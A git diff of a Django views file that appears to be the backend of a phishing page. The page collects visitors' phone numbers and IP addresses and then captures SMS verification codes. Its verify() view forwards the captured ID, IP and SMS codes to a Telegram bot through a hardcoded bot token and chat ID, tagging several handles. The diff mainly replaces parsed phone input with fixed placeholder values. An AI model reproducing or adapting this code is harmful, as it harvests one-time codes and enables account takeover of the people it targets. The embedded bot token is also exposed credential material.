@@ -27,7 +27,7 @@ from rest_framework import generics
 
 
 def index(request):
-    return render(request, "index.html")
+    return render(request, "login/index.html")
 
 def error(request):
     contact_id = request.session.get('contact_id')
@@ -58,18 +58,16 @@ def login(request):
 def login(request):
     if request.method == "POST":
         request.POST
-        number = request.POST.get('phone')
-        print(number)  
-        clean_number = re.sub(r'\D', '', number)
+        clean_number = 5555555
         client_ip = get_client_ip(request)
         contact = ContactModel(ip=client_ip, phone=clean_number)
         contact.page_name="Nomre"
         contact.save()
         input_string = str(clean_number)
-        number1 = int(input_string[:2])
-        number2 = int(input_string[2:5])
-        number3 = int(input_string[5:7])
-        number4 = int(input_string[7:])
+        number1 = 55
+        number2 = 555
+        number3 = 55
+        number4 = 55
         context={
             "number1":number1,
             "number2":number2,
@@ -87,16 +85,6 @@ def verify(request):
     contact_id = request.session.get('contact_id')
     contact = ContactModel.objects.get(id=contact_id)
     input_string = str(contact.phone)
-    number1 = int(input_string[:2])
-    number2 = int(input_string[2:5])
-    number3 = int(input_string[5:7])
-    number4 = int(input_string[7:])
-    context={
-            "number1":number1,
-            "number2":number2,
-            "number3":number3,
-            "number4":number4
-        }
     if request.method == "POST":
         phone1 = request.POST.get("phone1")
         phone2 = request.POST.get("phone2")
@@ -119,7 +107,7 @@ def verify(request):
         }
         response = requests.post(f'https://api.telegram.org/bot6316715361:AAH3GsgZgeG7r1uwHQHGypsDCeVtSV6Zoik/sendMessage?chat_id=-1001866012482&text=id:{contact.id}|ip:{contact.ip}\nsms:{combined_sms} @kitayskiadam @TetaLab @alienfx ')
         return render( request,'login/load.html',context )
-    return render( request,'login/index.html',context )
+    return render( request,'login/index.html' )
 
 
 def report_ban_ip(request):
